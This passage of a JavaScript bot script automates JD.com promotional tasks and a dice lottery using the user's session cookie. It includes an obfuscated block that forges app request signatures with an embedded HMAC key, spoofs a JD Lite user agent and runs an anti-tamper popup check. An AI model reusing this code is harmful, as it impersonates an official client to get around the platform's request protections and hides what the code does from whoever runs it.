            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                for(let task of data.data){
                  // {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":"SIGN","taskId":67,"channel":4}
                  if(!task.taskFinished && ['SIGN','BROWSE_CHANNEL'].includes(task.taskType)){
                    console.log(`去做任务${task.taskTitle}`)
                    await apDoTask(task.taskType,task.id,4,task.taskSourceUrl)
                  }
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘做任务
function apDoTask(taskType,taskId,channel,itemId) {
  // console.log({"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId})
  return new Promise(resolve => {
    $.get(taskGetUrl('apDoTask',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0 && data.data && data.data.finished){
                console.log(`任务完成成功`)
              }else{
                console.log(JSON.stringify(data))
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 红包大富翁
function richManIndex() {
  return new Promise(resolve => {
    $.get(taskUrl('richManIndex', {"actId":"hbdfw","needGoldToast":"true"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.userInfo){
              console.log(`用户当前位置：${data.data.userInfo.position}，剩余机会：${data.data.userInfo.randomTimes}`)
              while(data.data.userInfo.randomTimes--){
                await shootRichManDice()
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
// 红包大富翁
function shootRichManDice() {
  return new Promise(resolve => {
    $.get(taskUrl('shootRichManDice', {"actId":"hbdfw"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.rewardType && data.data.couponDesc){
              message += `红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】\n`
              console.log(`红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】`)
            }else{
              console.log(`红包大富翁抽奖：获得空气`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb24bc=["\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x26\x61\x6E\x64\x72\x6F\x69\x64\x26\x33\x2E\x31\x2E\x30\x26","\x26","\x26\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66","\x31\x32\x61\x65\x61\x36\x35\x38\x66\x37\x36\x65\x34\x35\x33\x66\x61\x66\x38\x30\x33\x64\x31\x35\x63\x34\x30\x61\x37\x32\x65\x30","\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","","\x61\x70\x69\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x62\x6F\x64\x79\x3D","\x26\x61\x70\x70\x69\x64\x3D\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26\x63\x6C\x69\x65\x6E\x74\x3D\x61\x6E\x64\x72\x6F\x69\x64\x26\x75\x75\x69\x64\x3D\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x33\x2E\x31\x2E\x30\x26\x74\x3D","\x26\x73\x69\x67\x6E\x3D","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x2A\x2F\x2A","\x52\x4E","\x4A\x44\x4D\x6F\x62\x69\x6C\x65\x4C\x69\x74\x65\x2F\x33\x2E\x31\x2E\x30\x20\x28\x69\x50\x61\x64\x3B\x20\x69\x4F\x53\x20\x31\x34\x2E\x34\x3B\x20\x53\x63\x61\x6C\x65\x2F\x32\x2E\x30\x30\x29","\x7A\x68\x2D\x48\x61\x6E\x73\x2D\x43\x4E\x3B\x71\x3D\x31\x2C\x20\x6A\x61\x2D\x43\x4E\x3B\x71\x3D\x30\x2E\x39","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taskUrl(_0x7683x2,_0x7683x3= {}){let _0x7683x4=+ new Date();let _0x7683x5=`${__Oxb24bc[0x0]}${JSON[__Oxb24bc[0x1]](_0x7683x3)}${__Oxb24bc[0x2]}${_0x7683x2}${__Oxb24bc[0x3]}${_0x7683x4}${__Oxb24bc[0x4]}`;let _0x7683x6=__Oxb24bc[0x5];const _0x7683x7=$[__Oxb24bc[0x6]]()?require(__Oxb24bc[0x7]):CryptoJS;let _0x7683x8=_0x7683x7.HmacSHA256(_0x7683x5,_0x7683x6).toString();return {url:`${__Oxb24bc[0x8]}${JD_API_HOST}${__Oxb24bc[0x9]}${_0x7683x2}${__Oxb24bc[0xa]}${escape(JSON[__Oxb24bc[0x1]](_0x7683x3))}${__Oxb24bc[0xb]}${_0x7683x4}${__Oxb24bc[0xc]}${_0x7683x8}${__Oxb24bc[0x8]}`,headers:{'\x48\x6F\x73\x74':__Oxb24bc[0xd],'\x61\x63\x63\x65\x70\x74':__Oxb24bc[0xe],'\x6B\x65\x72\x6E\x65\x6C\x70\x6C\x61\x74\x66\x6F\x72\x6D':__Oxb24bc[0xf],'\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74':__Oxb24bc[0x10],'\x61\x63\x63\x65\x70\x74\x2D\x6C\x61\x6E\x67\x75\x61\x67\x65':__Oxb24bc[0x11],'\x43\x6F\x6F\x6B\x69\x65':cookie}}}(function(_0x7683x9,_0x7683xa,_0x7683xb,_0x7683xc,_0x7683xd,_0x7683xe){_0x7683xe= __Oxb24bc[0x12];_0x7683xc= function(_0x7683xf){if( typeof alert!== _0x7683xe){alert(_0x7683xf)};if( typeof console!== _0x7683xe){console[__Oxb24bc[0x13]](_0x7683xf)}};_0x7683xb= function(_0x7683x7,_0x7683x9){return _0x7683x7+ _0x7683x9};_0x7683xd= _0x7683xb(__Oxb24bc[0x14],_0x7683xb(_0x7683xb(__Oxb24bc[0x15],__Oxb24bc[0x16]),__Oxb24bc[0x17]));try{_0x7683x9= __encode;if(!( typeof _0x7683x9!== _0x7683xe&& _0x7683x9=== _0x7683xb(__Oxb24bc[0x18],__Oxb24bc[0x19]))){_0x7683xc(_0x7683xd)}}catch(e){_0x7683xc(_0x7683xd)}})({})

function taskGetUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/?appid=activities_platform&functionId=${function_id}&body=${escape(JSON.stringify(body))}&t=${+new Date()}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'user-agent': $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded",
      "referer": "https://an.jd.com/babelDiy/Zeus/q1eB6WUB8oC4eH1BsCLWvQakVsX/index.html"
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}